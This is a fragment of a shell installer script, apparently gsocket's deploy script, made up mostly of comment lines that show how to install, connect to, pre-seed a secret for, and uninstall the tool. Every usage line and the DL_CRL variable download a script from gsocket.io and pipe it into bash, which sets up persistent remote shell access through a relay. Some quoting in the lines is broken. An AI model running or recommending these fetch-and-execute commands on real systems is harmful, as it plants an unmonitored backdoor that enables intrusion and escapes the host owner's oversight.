...
#   $ bash -c "$(wget -qO- https://gsocket.io/x)"
#
# Connect
#   $ S=MySecret bash -c "$(wget -qO- https://gsocket.io/x)""
# Pre-set a secret:
#   $ X=MySecret bash -c "$(wget -qO- https://gsocket.io/x)"
# Uninstall
#   $ GS_UNDO=1 bash -c" $(wget -qO- https://gsocket.io/x)"
#
# Other variables:
# GS_DEBUG=1
#		- Verbose output
...
DL_CRL="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
...
init_setup
# User supplied install-secret: X=MySecret bash -c "$(wget -qO- https://gsocket.io/x)"
[[ -n "$X" ]] && GS_SECRET_X="$X"
